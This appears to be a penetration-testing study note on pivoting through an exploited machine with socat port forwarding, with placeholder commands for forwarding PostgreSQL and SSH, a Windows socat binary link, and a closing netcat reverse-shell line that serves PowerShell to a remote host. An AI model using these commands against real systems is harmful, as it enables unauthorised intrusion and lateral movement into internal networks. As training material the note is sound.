Port forwarding is a technique that let one machine "bridge" his connection between two networks. In a case where we want to access to the machine B (a database) that is connected to the machine A (a virtual machine) that is connected to the WAN, we want first to exploit and access the machine A in order to reach the second machine, routable only through the network in which there is the machine A.

# Using Socat
## Socat is a useful tool for Port Forwarding. Let's start it in verbose mode with

```shell
socat -ddd TCP-LISTEN:<KALI-PORT>,fork TCP:<TARGET-MACHINE>:<TARGET-PORT>
```

Next we will connect to it from the Kali VM with the PostgreSQL client that we have only on the Kali machine.

```shell
psql -h <TARGET-IP> -p <TARGET-PORT> -U postgres
```

For an SSH forwarding we can use

```shell
socat -ddd TCP-LISTEN:22,fork TCP:<TARGET-MACHINE>:2222
```

And then we can connect to it via

```shell
ssh user@<TARGET-IP> -p <TARGET-PORT>
```

An useful pre-compiled binary for Windows is [socat-1.7.3.0.exe](https://github.com/tech128/socat-1.7.3.0-windows/tree/master). It has to be run in the folder with all the DLL files. In this way we get a port forwarding from an exploited Windows machine to our Kali machine, and we can connect to the network the Windows machine is connected to.

```powershell
.\socat.exe TCP-LISTEN:2222, TCP:192.168.45.223:4444
```

An example of RevShell for this scenario is

```powershell
nc.exe <IP> 2222 -e powershell

